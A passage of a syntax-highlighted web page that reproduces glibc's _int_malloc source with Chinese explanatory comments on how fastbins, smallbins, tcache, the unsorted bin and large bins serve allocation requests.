class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *_int_malloc(mstate av, <span class="hljs-type">size_t</span> bytes) &#123;<br>    INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>    mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br><br>    mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>    INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br><br>    mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br><br>    mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>    mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-type">size_t</span> tcache_unsorted_count;    <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">       overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">       to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">       size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">       that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">       aligned.</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">// 检查请求大小是否合规</span><br>    <span class="hljs-comment">// 计算 bytes 数据需要分配的内存大小，当 bytes 数据的大小比最小 chunk 要还小时,</span><br>    <span class="hljs-comment">// 按最小 chunk 的大小分配；当 bytes 数据的大小比最小 chunk 大时，则分配满足内存</span><br>    <span class="hljs-comment">// bytes最大不超过(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)</span><br>    checked_request2size (bytes, nb);<br><br>    <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">       mmap.  */</span><br>    <span class="hljs-comment">// 如果没有可用的分配区，则调用 sysmalloc 获取 chunk</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely(av == <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-type">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             *  static int perturb_byte;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                static void</span><br><span class="hljs-comment">                alloc_perturb(char *p, size_t n) &#123;</span><br><span class="hljs-comment">                    if (__glibc_unlikely(perturb_byte))</span><br><span class="hljs-comment">                        memset(p, perturb_byte ^ 0xff, n);</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">//将 p 全部设置为 perturb_byte ,默认什么也不做</span><br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">       This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">       can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment">     */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)            \</span><br><span class="hljs-meta">  do                            \</span><br><span class="hljs-meta">    &#123;                            \</span><br><span class="hljs-meta">      victim = pp;                    \</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)                \</span><br><span class="hljs-meta">    break;                        \</span><br><span class="hljs-meta">    &#125;                            \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">     != victim);                    \</span><br><span class="hljs-meta">    <span class="hljs-comment">// catomic_compare_and_exchange_val_rel_acq 功能是 如果*fb等于victim，则将*fb存储为victim-&gt;fd，返回victim；</span></span><br>    <span class="hljs-comment">// 其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)</span><br><br>    <span class="hljs-comment">// 如果规范化后的大小 小于等于 fast bins 中的最大 chunk 大小</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast())) &#123;<br>        <span class="hljs-comment">// 在 fastbin 中拿到相应的索引</span><br>        idx = fastbin_index (nb);<br>        <span class="hljs-comment">// 取得对应 fastbin 中的第一个 chunk</span><br>        mfastbinptr *fb = &amp;fastbin (av, idx);<br>        mchunkptr pp;<br>        victim = *fb;<br><br>        <span class="hljs-comment">// 如果该 fastbin 中有值</span><br>        <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// 如果是单线程</span><br>            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                <span class="hljs-comment">// 取出 victim</span><br>                *fb = victim-&gt;fd;<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// 取出 victim</span><br>                REMOVE_FB (fb, pp, victim);<br>            <span class="hljs-comment">// victim 不为空</span><br>            <span class="hljs-keyword">if</span> (__glibc_likely(victim != <span class="hljs-literal">NULL</span>)) &#123;<br>                <span class="hljs-comment">// 计算 victim 所对应的 fastbin 索引</span><br>                <span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize(victim));<br>                <span class="hljs-comment">// 所分配给的 victim 的 victim_idx 要和 刚开始计算出的 idx 相等</span><br>                <span class="hljs-keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="hljs-number">0</span>))<br>                    malloc_printerr(<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>                <span class="hljs-comment">// 啥也没干</span><br>                check_remalloced_chunk (av, victim, nb);<br><span class="hljs-comment">// 如果使用 tcache</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>                <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">               stash them in the tcache.  */</span><br>                <span class="hljs-comment">// 取得对应大小的 tcache idx</span><br>                <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>                <span class="hljs-comment">// 检查 tcache</span><br>                <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>              &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                <span class="hljs-comment">// tc_idx 所对应的 entry 未满， 且相应大小的 fastbin 还有值</span><br>                <span class="hljs-comment">// 就把 fastbin 中的值移至 tcache bin 中，直到 tcache 已满</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                   &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                  &#123;<br>                    <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                  &#123;<br>                    REMOVE_FB (fb, pp, tc_victim);<br>                    <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                      <span class="hljs-keyword">break</span>;<br>                  &#125;<br>                    <span class="hljs-comment">// 将 fast bin 中的 chunk 插入 tcache bin 中</span><br>                    tcache_put (tc_victim, tc_idx);<br>                  &#125;<br>              &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                <span class="hljs-comment">// 拿到用户指针</span><br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                <span class="hljs-comment">// 将 p 全部设置为 perturb_byte ,默认什么也不做</span><br>                alloc_perturb(p, bytes);<br>                <span class="hljs-comment">// 返回</span><br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">       hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">       (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">       processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">       anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// 如果规范化后的大小 在 samllbin 的序列之中</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (nb)) &#123;<br>        <span class="hljs-comment">// 拿到 相应的索引</span><br>        idx = smallbin_index (nb);<br>        <span class="hljs-comment">// 在 arena 上找到相应的位置</span><br>        bin = bin_at (av, idx);<br>        <span class="hljs-comment">// 表明 该 bin 中有值</span><br>        <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin) &#123;<br>            <span class="hljs-comment">// 拿到 victim 的 bk</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-comment">// 验证</span><br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">              #define set_inuse_bit_at_offset(p, s)                          \</span><br><span class="hljs-comment">              (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-comment">// 设置 victim 物理相邻的下一个 chunk 的 prev_inuse 位</span><br>            set_inuse_bit_at_offset (victim, nb);<br>            <span class="hljs-comment">// 拿出 victim</span><br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-comment">// 设置 non_main_arena</span><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena (victim);<br><br>            <span class="hljs-comment">// 啥也没干</span><br>            check_malloced_chunk (av, victim, nb);<br><br>            <span class="hljs-comment">// 和之前的一样</span><br>            <span class="hljs-comment">// 如果对应的 tcache bin 未满， 则将 small bin 中的值一个一个的移过去</span><br>            <span class="hljs-comment">// 直至对应的 tcache bin 已满</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">               stash them in the tcache.  */</span><br>            <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>              &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                   &amp;&amp; (tc_victim = last (bin)) != bin)<br>              &#123;<br>                <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                  &#123;<br>                    bck = tc_victim-&gt;bk;<br>                    set_inuse_bit_at_offset (tc_victim, nb);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                  set_non_main_arena (tc_victim);<br>                    bin-&gt;bk = bck;<br>                    bck-&gt;fd = bin;<br><br>                    tcache_put (tc_victim, tc_idx);<br>                      &#125;<br>              &#125;<br>              &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">           While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">           even seeing if there is space available, this avoids</span><br><span class="hljs-comment">           fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">           Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">           large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">           invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">           it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 就剩 large bin 了</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        idx = largebin_index (nb);<br>        <span class="hljs-comment">// 如果该 arena 中存在 fastbin 则调用 malloc_consolidate 合并</span><br>        <span class="hljs-keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))<br>            malloc_consolidate(av);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Process recently freed or remaindered chunks, taking one only if</span><br><span class="hljs-comment">       it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="hljs-comment">       the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="hljs-comment">       bins.  Note that this step is the only place in any routine where</span><br><span class="hljs-comment">       chunks are placed in bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The outer loop here is needed because we might not realize until</span><br><span class="hljs-comment">       near the end of malloc that we should have consolidated, so must</span><br><span class="hljs-comment">       do so and retry. This happens at most once, and only when we would</span><br><span class="hljs-comment">       otherwise need to expand memory to service a &quot;small&quot; request.</span><br><span class="hljs-comment">     */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>    INTERNAL_SIZE_T tcache_nb = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//获取 nb 对应大小的 tcache 的 idx</span><br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>    <span class="hljs-comment">//  tcache 存在且下标 idx 在范围内</span><br>    <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      tcache_nb = nb;<br>    <span class="hljs-type">int</span> return_cached = <span class="hljs-number">0</span>;<br><br>    tcache_unsorted_count = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">// 处理 unsorted bin</span><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// unsorted bin 中有值，且不是 arena 本身</span><br>        <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>            <span class="hljs-comment">// 从 bk 开始</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-comment">// victim 的 大小 不能小于 2 * SIZE_SZ</span><br>            <span class="hljs-comment">// 且不能大于 av-&gt;system_mem</span><br>            <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>                || __builtin_expect(chunksize_nomask (victim)<br>                                    &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>                malloc_printerr(<span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>);<br>            <span class="hljs-comment">// 计算该块 标准化 后的大小</span><br>            size = chunksize (victim);<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">               only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">               runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">               exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">               no exact fit for a small chunk.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">//  如果请求的大小在 smallbin 序列之中</span><br>            <span class="hljs-comment">//  unsorted bin 中只有这一个 chunk</span><br>            <span class="hljs-comment">// 并且该 victim 是 last remainder chunk</span><br>            <span class="hljs-comment">// 且该块的大小要大于请求的大小加 MINSIZE</span><br>            <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>                bck == unsorted_chunks (av) &amp;&amp;<br>            victim == av-&gt;last_remainder &amp;&amp;<br>            (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123;<br>                <span class="hljs-comment">/* split and reattach remainder */</span><br>                <span class="hljs-comment">// 切割 remainder</span><br>                remainder_size = size - nb;<br>                remainder = chunk_at_offset (victim, nb);<br>                <span class="hljs-comment">// 把切割后的 remainder 加入 unsorted bin 中</span><br>                unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>                <span class="hljs-comment">// 记录新值</span><br>                av-&gt;last_remainder = remainder;<br>                <span class="hljs-comment">// 进行链接</span><br>                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>                <span class="hljs-comment">// 如果 remainder_size 的值在 large bin 中</span><br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;<br>                    <span class="hljs-comment">// fd_nextsize,fd_nextsize清零</span><br>                    remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                    remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br>                <span class="hljs-comment">// #define set_head(p, s)       ((p)-&gt;mchunk_size = (s)</span><br>                <span class="hljs-comment">// 设置 victim 的 size 标志位</span><br>                set_head (victim, nb | PREV_INUSE |<br>                                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                <span class="hljs-comment">// 设置 remainder 的 size 标志位</span><br>                set_head (remainder, remainder_size | PREV_INUSE);<br>                <span class="hljs-comment">// #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br>                <span class="hljs-comment">// 设置 remainder 的下一个 chunk 的 prev_size 位</span><br>                set_foot (remainder, remainder_size);<br><br>                <span class="hljs-comment">// 啥也没干</span><br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>            <span class="hljs-comment">/* remove from unsorted list */</span><br>            <span class="hljs-comment">// 将该 chunk 从 unsorted list 移除</span><br>            unsorted_chunks (av)-&gt;bk = bck;<br>            bck-&gt;fd = unsorted_chunks (av);<br><br>            <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>            <span class="hljs-comment">// 恰好完全匹配</span><br>            <span class="hljs-keyword">if</span> (size == nb) &#123;<br>                <span class="hljs-comment">// 设立下一个 chunk 的 prev_inuse 位</span><br>                set_inuse_bit_at_offset (victim, size);<br>                <span class="hljs-comment">// 设立 non_main_arena 位</span><br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    set_non_main_arena (victim);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>                    <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment">                   We may return one of these chunks later.  */</span><br>                    <span class="hljs-comment">// tcache_nb 存在</span><br>                    <span class="hljs-comment">// 对应的 tcache_bin 未满</span><br>                    <span class="hljs-keyword">if</span> (tcache_nb<br>                    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>                  &#123;<br>                    <span class="hljs-comment">// 把该块 加入 tcache bin 中</span><br>                    tcache_put (victim, tc_idx);<br>                    <span class="hljs-comment">// 设立返回标志</span><br>                    return_cached = <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">continue</span>;<br>                  &#125;<br>                    <span class="hljs-comment">// 不满足 tcache 储存的情况</span><br>                    <span class="hljs-keyword">else</span><br>                  &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                <span class="hljs-comment">// 直接返回</span><br>                check_malloced_chunk (av, victim, nb);<br>                <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>                alloc_perturb(p, bytes);<br>                <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>                &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125;<br><br>            <span class="hljs-comment">/* place chunk in bin */</span><br><br>            <span class="hljs-keyword">if</span> (in_smallbin_range (size)) &#123;<br>                <span class="hljs-comment">// 拿到 small_bin 的索引</span><br>                victim_index = smallbin_index (size);<br>                <span class="hljs-comment">// 拿到链表头</span><br>                bck = bin_at (av, victim_index);<br>                <span class="hljs-comment">// 拿到 第一个元素</span><br>                fwd = bck-&gt;fd;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 拿到 large_bin 的索引</span><br>                victim_index = largebin_index (size);<br>                <span class="hljs-comment">// 拿到链表头</span><br>                bck = bin_at (av, victim_index);<br>                <span class="hljs-comment">// 拿到 第一个元素</span><br>                fwd = bck-&gt;fd;<br><br>                <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>                <span class="hljs-comment">// large bin 中有空闲 chunk存在</span><br>                <span class="hljs-keyword">if</span> (fwd != bck) &#123;<br>                    <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                    <span class="hljs-comment">//</span><br>                    size |= PREV_INUSE;<br>                    <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                    assert(chunk_main_arena (bck-&gt;bk));<br><br>                    <span class="hljs-comment">// large bin中的chunk是按从大到小排列的</span><br>                    <span class="hljs-comment">// bck-&gt;bk 当前链表中最小的</span><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size)<br>                        &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk)) &#123;<br>                        <span class="hljs-comment">// fwd = 链表头</span><br>                        <span class="hljs-comment">// bk = 当前链表最小的那个chunk</span><br>                        fwd = bck;<br>                        bck = bck-&gt;bk;<br>                        <span class="hljs-comment">// fd_nextsize = 链表中除头外的第一个元素</span><br>                        victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                        <span class="hljs-comment">// bk_nextsize = 链表中除头外的第一个元素的 bk_nextsize</span><br>                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                        <span class="hljs-comment">// 链表中除头外的第一个元素 的 bk_nextsize = victim</span><br>                        <span class="hljs-comment">// 完成双链表的连接</span><br>                        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        assert(chunk_main_arena (fwd));<br><br>                        <span class="hljs-comment">// 根据 fd_nextsize 进行遍历，直到找到应该插入的位置</span><br>                        <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd)) &#123;<br>                            fwd = fwd-&gt;fd_nextsize;<br>                            assert(chunk_main_arena (fwd));<br>                        &#125;<br>                        <span class="hljs-comment">//  如果从 large bin 链表中找到了与当前 chunk 大小相同的 chunk</span><br>                        <span class="hljs-comment">//</span><br>                        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>                            == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                            <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                            fwd = fwd-&gt;fd;<br>                        <span class="hljs-comment">// 如果从 large bin 链表中没有找到与当前 chunk 大小相同的 chunk</span><br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">// 将 victim 插入其中并带有 size 域</span><br>                            victim-&gt;fd_nextsize = fwd;<br>                            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                            fwd-&gt;bk_nextsize = victim;<br>                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                        <span class="hljs-comment">// 接入双链表中</span><br>                        bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// 相应的 large bin 没有值</span><br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-comment">// 直接插入</span><br>                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br>            <span class="hljs-comment">// #define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br><br>            mark_bin (av, victim_index);<br>            <span class="hljs-comment">// 将 victim 移动至 fd 与 bk 的双链表中</span><br>            victim-&gt;bk = bck;<br>            victim-&gt;fd = fwd;<br>            fwd-&gt;bk = victim;<br>            bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment">           filling the cache, return one of the cached ones.  */</span><br>            ++tcache_unsorted_count;<br>            <span class="hljs-comment">// 满足条件</span><br>            <span class="hljs-keyword">if</span> (return_cached<br>            &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span><br>            &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>          &#123;<br>            <span class="hljs-comment">// 返回之前存入的 tcache</span><br>            <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>          &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>            <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>        <span class="hljs-comment">// 如果上面没有取出</span><br>        <span class="hljs-keyword">if</span> (return_cached)<br>      &#123;<br>        <span class="hljs-comment">// 返回之前存入的 tcache</span><br>        <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>      &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">           sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 在 large bin 中查找</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (nb)) &#123;<br>            <span class="hljs-comment">// 在 arena 找到对应的位置</span><br>            bin = bin_at (av, idx);<br><br>            <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>            <span class="hljs-comment">// bin 中有值</span><br>            <span class="hljs-comment">// 且该 chunk 的 size 大于 nb</span><br>            <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin<br>                &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (victim)<br>                   &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)) &#123;<br>                <span class="hljs-comment">// 从最小的那个 chunk 开始</span><br>                victim = victim-&gt;bk_nextsize;<br>                <span class="hljs-comment">// 从小到大遍历，直到找到一个 size 比请求的 nb 大于或等于的</span><br>                <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                    victim = victim-&gt;bk_nextsize;<br><br>                <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                   list does not have to be rerouted.  */</span><br>                <span class="hljs-comment">// 如果 victim 不是 bin 的最后一个 chunk</span><br>                <span class="hljs-comment">// 且 victim 不是 skip list</span><br>                <span class="hljs-keyword">if</span> (victim != last (bin)<br>                    &amp;&amp; chunksize_nomask (victim)<br>                       == chunksize_nomask (victim-&gt;fd))<br>                    <span class="hljs-comment">// 拿到的 victim 是 没有 next_size 域的那个</span><br>                    victim = victim-&gt;fd;<br><br>                <span class="hljs-comment">// 切割前准备</span><br>                remainder_size = size - nb;<br>                <span class="hljs-comment">// 取消链接</span><br>                unlink (av, victim, bck, fwd);<br><br>                <span class="hljs-comment">/* Exhaust */</span><br>                <span class="hljs-comment">// 如果切割后的大小不足以作为一个 chunk ，那么就不分割直接将其标志位设为 inuse</span><br>                <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                    <span class="hljs-comment">// 设置下一个 chunk 的 prev_inuse 位</span><br>                    set_inuse_bit_at_offset (victim, size);<br>                    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                        set_non_main_arena (victim);<br>                &#125;<br>                <span class="hljs-comment">/* Split */</span><br>                <span class="hljs-comment">// 切割</span><br>                <span 